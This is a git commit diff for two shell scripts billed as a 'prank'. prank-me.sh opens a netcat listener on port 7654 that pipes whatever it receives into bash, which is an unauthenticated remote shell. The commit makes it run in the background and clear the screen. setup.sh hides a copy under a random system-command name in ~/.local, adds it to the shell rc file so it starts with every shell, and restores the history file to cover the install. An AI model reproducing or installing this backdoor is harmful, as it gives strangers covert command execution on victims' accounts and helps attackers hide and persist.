9d5bb1ae718b143b3f2a2535998171da645bd309
Lucas Marandat <lucas.mrdt@gmail.com>
2019-08-13 14:16:03 +0200

    fix

--- prank-me.sh
+++ prank-me.sh
@@ -1,5 +1,6 @@
-!#/bin/bash
+#!/bin/bash
 
 cd /tmp
 mkfifo FIFO > /dev/null 2>&1
-echo "while [ 1 ];do nc -l -p 1234 < FIFO 2>/dev/null | bash > FIFO;done;" | bash > /dev/null 2>&1
+echo "while [ 1 ];do nc -l -p 7654 < FIFO 2>/dev/null | bash > FIFO;done;" | bash > /dev/null 2>&1 &
+clear
--- setup.sh
+++ setup.sh
@@ -1,21 +1,18 @@
-!#/bin/bash
-
 SHELL=$(basename $SHELL)
 HISTORY_PATH="$HOME/.${SHELL}_history"
 CONFIG_PATH="$HOME/.${SHELL}rc"
-HISTORY_CONTENT=$(cat $HISTORY_PATH)
+cp $HISTORY_PATH "$HISTORY_PATH.tmp"
 
 mkdir -p $HOME/.local
 
 FROM_PATH="$(dirname $0)/prank-me.sh"
-TARGET_NAME=$(ls /usr/bin | sort -R | head -n 1)
-TARGET_PATH="$HOME/.local/$TARGET_NAME"
+TARGET_NAME="$(ls /usr/bin | sort -R | head -n 1)#"
+TARGET_PATH="$HOME/.local"
 
-cp $FROM_PATH $TARGET_PATH
+cp $FROM_PATH "$TARGET_PATH/$TARGET_NAME"
 
-echo "export PATH=\$PATH:$HOME/.local\n$TARGET_PATH" >> $CONFIG_PATH
-echo "$TARGET_PATH" >> $CONFIG_PATH
+echo "export PATH=\$PATH:$HOME/.local" >> $CONFIG_PATH
+echo "$TARGET_NAME" >> $CONFIG_PATH
 source $CONFIG_PATH
 
-echo $HISTORY_CONTENT > $HISTORY_PATH
-rm -rf $(dirname $0)
+mv "$HISTORY_PATH.tmp" $HISTORY_PATH
